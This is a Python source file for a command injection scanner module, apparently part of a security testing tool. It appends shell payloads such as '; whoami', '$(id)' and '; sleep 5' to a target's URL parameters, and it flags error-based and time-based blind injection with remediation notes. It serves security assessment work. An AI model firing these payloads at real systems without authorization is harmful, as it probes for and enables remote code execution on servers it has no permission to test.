import os
import time
import requests
from urllib.parse import quote, urlparse
from colorama import Fore, Style, init

init(autoreset=True)


class CommandInjectionAgent:
    def __init__(self, target_url, session=None):
        self.target = target_url
        self.session = session or requests.Session()
        self.session.headers.update({
            'User-Agent': (
                'SecurityAudit/1.0 '
                '(Authorized Assessment)'
            )
        })
        self.findings = []
        self.payloads = self._load_payloads()

    def _load_payloads(self):
        path = os.path.join(
            'payloads',
            'command_injection_payloads.txt'
        )
        try:
            with open(path, 'r') as f:
                return [
                    l.strip() for l in f
                    if l.strip()
                    and not l.startswith('#')
                ]
        except FileNotFoundError:
            return [
                '; ls', '| ls', '& ls',
                '; whoami', '| whoami',
                '; sleep 5', '| sleep 5',
                '$(id)', '`id`'
            ]

    def _build_url(self, parsed, params):
        q = '&'.join(
            f'{k}={quote(str(v), safe="")}'
            for k, v in params.items()
        )
        return (
            f"{parsed.scheme}://{parsed.netloc}"
            f"{parsed.path}?{q}"
        )

    def detect_error_based(self, url):
        print(
            f"  {Fore.CYAN}[*] Testing command "
            f"injection (error-based)..."
            f"{Style.RESET_ALL}"
        )
        os_indicators = [
            'uid=', 'gid=', 'groups=',
            'root:', 'daemon:', '/bin/sh',
            'volume serial', 'windows ip',
            'directory of', 'total 0',
            '/usr/bin', '/usr/local',
            'drwxr', '-rwxr'
        ]

        parsed = urlparse(url)
        if not parsed.query:
            return self.findings

        params = {}
        for p in parsed.query.split('&'):
            if '=' in p:
                k, v = p.split('=', 1)
                params[k] = v

        for param in list(params.keys())[:3]:
            for payload in self.payloads[:8]:
                test_params = params.copy()
                test_params[param] = (
                    params[param] + payload
                )
                test_url = self._build_url(
                    parsed, test_params
                )
                try:
                    r = self.session.get(
                        test_url, timeout=10
                    )
                    for indicator in os_indicators:
                        if indicator in r.text:
                            self.findings.append({
                                'type': (
                                    'Command Injection - '
                                    'Error Based'
                                ),
                                'category': (
                                    'command_injection'
                                ),
                                'risk': 'CRITICAL',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': indicator,
                                'description': (
                                    f'OS command output in '
                                    f'response for param '
                                    f'"{param}"'
                                ),
                                'business_impact': (
                                    'Remote Code Execution. '
                                    'Attacker has full server '
                                    'control. Complete compromise.'
                                ),
                                'fix': (
                                    '1. Never pass user input '
                                    'to OS commands\n'
                                    '2. Use language built-in '
                                    'functions instead\n'
                                    '3. Whitelist allowed values\n'
                                    '4. Run with minimal privileges'
                                ),
                                'cvss_score': 10.0,
                                'cwe': 'CWE-78'
                            })
                            print(
                                f"  {Fore.RED}"
                                f"[!!!] CMD INJECTION: "
                                f"{param}"
                                f"{Style.RESET_ALL}"
                            )
                            break
                except Exception:
                    pass

        return self.findings

    def detect_time_based(self, url):
        print(
            f"  {Fore.CYAN}[*] Testing command "
            f"injection (time-based)..."
            f"{Style.RESET_ALL}"
        )
        time_payloads = [
            '; sleep 5',
            '| sleep 5',
            '& sleep 5',
            '; ping -c 5 127.0.0.1',
        ]

        parsed = urlparse(url)
        if not parsed.query:
            return self.findings

        params = {}
        for p in parsed.query.split('&'):
            if '=' in p:
                k, v = p.split('=', 1)
                params[k] = v

        for param in list(params.keys())[:2]:
            try:
                baseline_start = time.time()
                self.session.get(url, timeout=12)
                baseline = time.time() - baseline_start
            except Exception:
                continue

            for payload in time_payloads[:3]:
                test_params = params.copy()
                test_params[param] = (
                    params[param] + payload
                )
                test_url = self._build_url(
                    parsed, test_params
                )
                try:
                    start = time.time()
                    self.session.get(
                        test_url, timeout=15
                    )
                    elapsed = time.time() - start

                    if elapsed > baseline + 4:
                        self.findings.append({
                            'type': (
                                'Command Injection - '
                                'Time Based Blind'
                            ),
                            'category': (
                                'command_injection'
                            ),
                            'risk': 'CRITICAL',
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'baseline_time': round(
                                baseline, 2
                            ),
                            'actual_time': round(
                                elapsed, 2
                            ),
                            'description': (
                                f'Blind command injection '
                                f'in "{param}". '
                                f'Delay: '
                                f'{round(elapsed-baseline,1)}s'
                            ),
                            'business_impact': (
                                'RCE via blind injection. '
                                'Server fully compromised.'
                            ),
                            'fix': (
                                '1. Avoid OS calls entirely\n'
                                '2. Use safe APIs/libraries\n'
                                '3. Input validation/whitelist'
                            ),
                            'cvss_score': 10.0,
                            'cwe': 'CWE-78'
                        })
                        print(
                            f"  {Fore.RED}"
                            f"[!!!] BLIND CMD INJECTION: "
                            f"{param}"
                            f"{Style.RESET_ALL}"
                        )
                except Exception:
                    pass

        return self.findings

    def run_full_scan(self, urls_to_test=None):
        print(
            f"\n{Fore.YELLOW}[COMMAND INJECTION AGENT] "
            f"Starting...{Style.RESET_ALL}"
        )
        test_urls = urls_to_test or [self.target]
        for url in test_urls:
            self.detect_error_based(url)
            self.detect_time_based(url)
        print(
            f"{Fore.GREEN}[COMMAND INJECTION AGENT] "
            f"Complete - {len(self.findings)} findings"
            f"{Style.RESET_ALL}"
        )
        return self.findings
